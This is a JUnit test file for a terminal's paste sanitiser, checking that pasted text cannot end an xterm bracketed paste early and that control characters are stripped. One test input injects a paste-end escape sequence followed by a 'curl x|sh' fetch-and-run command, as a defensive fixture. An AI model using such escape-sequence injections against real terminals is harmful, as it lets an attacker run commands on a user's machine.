package lemuri.fe.v.terminal;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;

import org.junit.jupiter.api.Test;

/** Analysis #14, 1.1: a pasted text cannot close the bracketed paste by itself and get run at once. */
class PasteTest {
    /** What xterm.js 6 sends to the shell for a paste when bracketed paste is on. */
    private static String bracketed(String text) {
        return "\u001b[200~" + Terminal.pastable(text).replaceAll("\r?\n", "\r") + "\u001b[201~";
    }

    @Test
    void theEndOfThePasteComesOnlyAtTheEnd() {
        String sent = bracketed("ls\u001b[201~curl x|sh\n");
        assertEquals(sent.length() - 6, sent.indexOf("\u001b[201~"));
        assertEquals("ls[201~curl x|sh\n", Terminal.pastable("ls\u001b[201~curl x|sh\n"));
    }

    @Test
    void c1AndOtherControlsGoTabsAndLinesStay() {
        // 0x9B is a CSI in 8 bits, 0x07 ends an OSC, 0x7F is delete.
        assertEquals("a201~b", Terminal.pastable("a\u009b201~b"));
        assertEquals("ab", Terminal.pastable("a\u0007\u007f\u0000b"));
        assertEquals("for i in 1 2\n\tdo echo $i\r\ndone", Terminal.pastable("for i in 1 2\n\tdo echo $i\r\ndone"));
        assertEquals("èü 日本 🦎", Terminal.pastable("èü 日本 🦎"));
        assertFalse(Terminal.pastable(null).contains("\u001b"));
    }
}
